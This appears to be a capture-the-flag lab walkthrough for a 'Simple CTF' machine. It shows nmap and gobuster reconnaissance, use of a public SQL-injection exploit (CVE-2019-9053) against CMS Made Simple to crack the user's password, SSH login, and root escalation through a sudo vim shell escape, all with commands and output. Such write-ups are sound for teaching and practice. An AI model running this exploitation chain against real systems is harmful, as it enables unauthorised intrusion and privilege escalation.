# Simple CTF

## 1 - How many services are running under port 1000?

Let's run nmap:
~~~
$ sudo nmap -sS -sV -A -p- 10.10.195.222

...[SNIP]...

PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.9.35.106
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 2 disallowed entries 
|_/ /openemr-5_0_1_3 
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 29:42:69:14:9e:ca:d9:17:98:8c:27:72:3a:cd:a9:23 (RSA)
|   256 9b:d1:65:07:51:08:00:61:98:de:95:ed:3a:e3:81:1c (ECDSA)
|_  256 12:65:1b:61:cf:4d:e5:75:fe:f4:e8:d4:6e:10:2a:f6 (ED25519)

...[SNIP]...

~~~

There are `2` services running under port 1000.

## 2 - What is running on the higher port?

On higher port, `ssh` is running on port `2222`.

## 3 - What's the CVE you're using against the application?

Listing directories on the web server with gobuster reveals the presence of a hidden directory (/simple)

~~~
$ gobuster dir -u http://10.10.195.222/ -w /data/src/wordlists/directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.195.222/
[+] Threads:        10
[+] Wordlist:       /data/src/wordlists/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/05/07 22:16:31 Starting gobuster
===============================================================
/simple (Status: 301)

...[SNIP]...
~~~

The application hosted behind the http://10.10.195.222/simple/ is a CMS (CMS Made Simple version 2.2.8).

Several vulnerabilities exist but the most relevant one is `CVE-2019-9053` (https://www.cvedetails.com/cve/CVE-2019-9053/).

## 4 - To what kind of vulnerability is the application vulnerable?

This CVE is about a SQL injection, commonly refered to as `sqli`.

## 5 - What's the password?

Let's exploit it. A python exploit is available here: https://www.exploit-db.com/exploits/46635

~~~
$ python exploit.py -u http://10.10.195.222/simple/ --crack -w best110.txt
[+] Salt for password found: 1dac0d92e9fa6bb2
[+] Username found: mitch
[+] Email found: admin@admin.com
[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
[+] Password cracked: secret
~~~

## 6 - Where can you login with the details obtained?

We may use these credentials to login against ``ssh`` (running on port 2222)

## 7 - What's the user flag?

~~~
$ sshpass -p "secret" ssh mitch@10.10.195.222 -p 2222 cat user.txt
G00d j0b, keep up!
~~~

## 8 - Is there any other user in the home directory? What's its name?

We find another user (`sunbath`) in the `/home` directory:
~~~
$ ls -l /home
total 8
drwxr-x---  3 mitch   mitch   4096 aug 19  2019 mitch
drwxr-x--- 16 sunbath sunbath 4096 aug 19  2019 sunbath
~~~

## 9 - What can you leverage to spawn a privileged shell?

When we connect, it looks like we have a customized shell (e.g. no TAB completion). It's easy to bypass it by running:

~~~
$ /bin/bash
~~~

Now we have a real shell! Let's see if we have sudo access:

~~~
mitch@Machine:/home$ sudo -l
User mitch may run the following commands on Machine:
    (root) NOPASSWD: /usr/bin/vim
~~~

So vim can be executed as root with no password.

~~~
mitch@Machine:/home$ sudo vim
~~~

Now in vim, type `:shell` and `ENTER`. You now have a shell with `root`.

## 10 - What's the root flag?

~~~
root@Machine:/home# cd /root/
root@Machine:/root# cat root.txt 
W3ll d0n3. You made it!
~~~
